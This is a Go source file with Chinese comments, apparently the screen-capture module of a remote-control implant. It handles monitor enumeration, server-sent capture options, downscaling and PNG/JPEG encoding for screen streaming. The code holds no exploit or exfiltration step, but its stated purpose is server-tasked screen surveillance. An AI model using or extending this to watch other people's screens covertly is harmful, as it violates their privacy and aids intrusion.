//go:build windows && !light

package main

import (
	"encoding/json"
	"syscall"
	"unsafe"
)

// ─── 截图/屏幕流参数化（ROADMAP P0.2） ────────────────────────────────
//
// 历史实现：截图固定「全虚拟屏幕 + PNG，>2MB 才转 JPEG」；屏幕流固定 800ms
// 一轮（1.25fps），帧率、画质、带宽都不可控，多显示器只能看到拼接后的整屏。
// 现在支持服务端下发参数：
//
//	{"monitor":2,"max_width":1280,"format":"jpeg","quality":70}
//
//   - monitor   0 = 全部显示器（虚拟屏幕拼接，默认）；N>=1 = 第 N 个显示器（按
//               EnumDisplayMonitors 顺序，主显示器通常是 1）
//   - max_width >0 时按比例缩小到该宽度（纯 Go 最近邻缩放，显著降低带宽）
//   - format    png / jpeg / auto（auto = 小图 PNG、大图 JPEG）
//   - quality   JPEG 质量 1-100（默认 75）

const (
	MONITORINFOF_PRIMARY     = 0x00000001
	MONITOR_DEFAULTTONEAREST = 0x00000002
)

var (
	procEnumDisplayMonitors = resolveAPI("user32.dll", "EnumDisplayMonitors")
	procGetMonitorInfoW     = resolveAPI("user32.dll", "GetMonitorInfoW")
)

type winRect struct {
	Left   int32
	Top    int32
	Right  int32
	Bottom int32
}

// monitorInfoW 对应 MONITORINFO。
type monitorInfoW struct {
	CbSize    uint32
	RcMonitor winRect
	RcWork    winRect
	DwFlags   uint32
}

// monitorRect 显示器矩形（虚拟屏幕坐标，物理像素）。
type monitorRect struct {
	X       int  `json:"x"`
	Y       int  `json:"y"`
	Width   int  `json:"width"`
	Height  int  `json:"height"`
	Primary bool `json:"primary"`
}

// captureOptions 截图参数（服务端 / 前端可下发；零值即历史默认行为）。
type captureOptions struct {
	Monitor  int    `json:"monitor"`
	MaxWidth int    `json:"max_width"`
	Format   string `json:"format"`
	Quality  int    `json:"quality"`
}

// parseCaptureOptions 解析任务参数（非法值静默回落到默认，避免植入端报错）。
func parseCaptureOptions(taskData string) captureOptions {
	opts := captureOptions{}
	if taskData != "" {
		_ = json.Unmarshal([]byte(taskData), &opts)
	}
	if opts.Monitor < 0 {
		opts.Monitor = 0
	}
	if opts.MaxWidth < 0 {
		opts.MaxWidth = 0
	}
	if opts.MaxWidth > 0 && opts.MaxWidth < 320 {
		opts.MaxWidth = 320 // 太小的宽度无意义，兜底到可读下限
	}
	if opts.Quality <= 0 || opts.Quality > 100 {
		opts.Quality = 75
	}
	switch opts.Format {
	case "png", "jpeg", "jpg", "auto":
	default:
		opts.Format = "auto"
	}
	if opts.Format == "jpg" {
		opts.Format = "jpeg"
	}
	return opts
}

// listMonitors 枚举显示器；失败返回 nil（调用方回退虚拟屏幕整屏捕获）。
func listMonitors() []monitorRect {
	if procEnumDisplayMonitors.resolved() == 0 || procGetMonitorInfoW.resolved() == 0 {
		return nil
	}
	var out []monitorRect
	cb := syscall.NewCallback(func(hMonitor uintptr, _ uintptr, _ uintptr, _ uintptr) uintptr {
		mi := monitorInfoW{CbSize: uint32(unsafe.Sizeof(monitorInfoW{}))}
		if ret, _, _ := procGetMonitorInfoW.Call(hMonitor, uintptr(unsafe.Pointer(&mi))); ret != 0 {
			out = append(out, monitorRect{
				X:       int(mi.RcMonitor.Left),
				Y:       int(mi.RcMonitor.Top),
				Width:   int(mi.RcMonitor.Right - mi.RcMonitor.Left),
				Height:  int(mi.RcMonitor.Bottom - mi.RcMonitor.Top),
				Primary: mi.DwFlags&MONITORINFOF_PRIMARY != 0,
			})
		}
		return 1 // 继续枚举
	})
	procEnumDisplayMonitors.Call(0, 0, cb, 0)
	return out
}

// captureRegion 依参数决定捕获区域：nil 表示整块虚拟屏幕。
func captureRegion(opts captureOptions) *monitorRect {
	if opts.Monitor <= 0 {
		return nil
	}
	monitors := listMonitors()
	if len(monitors) == 0 || opts.Monitor > len(monitors) {
		return nil
	}
	m := monitors[opts.Monitor-1]
	return &m
}

// scaledDimensions 计算缩放后的实际尺寸（结果 JSON 里回传，前端按真实尺寸渲染）。
func scaledDimensions(width, height, maxWidth int) (int, int) {
	if maxWidth <= 0 || width <= 0 || maxWidth >= width {
		return width, height
	}
	return maxWidth, height * maxWidth / width
}

// downscaleBGRA 按目标宽度等比缩小 BGRA 像素（最近邻，纯 Go，无额外依赖）。
// 用于带宽控制：1080p → 1280 宽可把 JPEG 体积降到约 1/2。
func downscaleBGRA(px []byte, stride, height, dstWidth int) ([]byte, int, int) {
	srcWidth := stride / 4
	if dstWidth <= 0 || dstWidth >= srcWidth || height <= 0 || srcWidth <= 0 {
		return px, stride, height
	}
	dstHeight := height * dstWidth / srcWidth
	if dstHeight <= 0 {
		return px, stride, height
	}
	dstStride := dstWidth * 4
	out := make([]byte, dstStride*dstHeight)
	for y := 0; y < dstHeight; y++ {
		sy := y * height / dstHeight
		srcRow := sy * stride
		dstRow := y * dstStride
		for x := 0; x < dstWidth; x++ {
			sx := x * srcWidth / dstWidth
			si := srcRow + sx*4
			di := dstRow + x*4
			out[di] = px[si]
			out[di+1] = px[si+1]
			out[di+2] = px[si+2]
			out[di+3] = px[si+3]
		}
	}
	return out, dstStride, dstHeight
}

// encodeCapture 按参数编码像素：返回 (base64 前的原始字节, 格式名)。
func encodeCapture(px []byte, stride, height int, opts captureOptions) ([]byte, string, error) {
	width := stride / 4

	// 按需缩放（带宽控制）
	if opts.MaxWidth > 0 {
		px, stride, height = downscaleBGRA(px, stride, height, opts.MaxWidth)
		width = stride / 4
	}
	_ = width

	switch opts.Format {
	case "jpeg":
		data, err := encodeToJPEG(px, stride, height, opts.Quality)
		return data, "jpeg", err
	case "png":
		data, err := encodeToPNG(px, stride, height)
		return data, "png", err
	default: // auto：先 PNG，超过 2MB 且 JPEG 更小时换 JPEG
		data, err := encodeToPNG(px, stride, height)
		if err != nil {
			return nil, "", err
		}
		if len(data) > 2*1024*1024 {
			if jpg, jerr := encodeToJPEG(px, stride, height, opts.Quality); jerr == nil && len(jpg) < len(data) {
				return jpg, "jpeg", nil
			}
		}
		return data, "png", nil
	}
}
